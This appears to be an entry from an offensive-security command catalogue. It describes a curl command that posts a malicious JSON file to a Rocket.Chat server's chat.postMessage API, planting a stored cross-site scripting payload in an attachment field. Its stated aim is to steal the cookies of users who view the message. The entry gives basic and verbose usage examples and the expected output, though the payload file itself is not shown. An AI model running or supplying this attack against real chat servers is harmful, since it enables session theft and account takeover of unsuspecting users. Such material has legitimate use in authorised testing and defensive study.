---
data: >-
  curl -H "X-Auth-Token: <Token>" -H "X-User-Id: <user Id>" -H
  "Content-type:application/json" https://<server>/api/v1/chat.postMessage -d
  @cookiesplz.json
tags:
  - api
  - xss
  - post-message
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: a3addd79-cc80-4bbc-ab37-62ae62b5f2da
created_at: '2025-12-14T03:47:13.113Z'
updated_at: '2025-12-14T03:47:13.113Z'
verified: false
validated: true
submitted: true
---
# curl-post-malicious-message-to-rocket-chat

## Command

```bash
curl -H "X-Auth-Token: <Token>" -H "X-User-Id: <user Id>" -H "Content-type:application/json" https://<server>/api/v1/chat.postMessage -d @cookiesplz.json
```

## Description

This command posts a malicious JSON payload to Rocket.Chat's chat.postMessage API endpoint, injecting a stored XSS via an attachment field to steal viewer cookies when rendered.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "X-Auth-Token: <Token>"` | Authentication token header | Yes |
| `-H "X-User-Id: <user Id>"` | User ID header for auth | Yes |
| `-H "Content-type:application/json"` | Sets request body as JSON | Yes |
| `https://<server>/api/v1/chat.postMessage` | API endpoint URL | Yes |
| `-d @cookiesplz.json` | Loads payload from file | Yes |

## Examples

### Basic Usage

```bash
curl -H "X-Auth-Token: abc123" -H "X-User-Id: user456" -H "Content-type:application/json" https://chat.example.com/api/v1/chat.postMessage -d @cookiesplz.json
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -H "X-Auth-Token: <Token>" -H "X-User-Id: <user Id>" -H "Content-type:application/json" https://<server>/api/v1/chat.postMessage -d @cookiesplz.json
```

## Expected Output

Successful response: {"success": true, "message": {"_id": "msg123", ...}}. Failure: {"success": false, "error": "..."}. The message is posted; XSS executes on view, alerting cookies.

## Related

- [[Related Procedure: Post-Malicious-Message-via-API]]
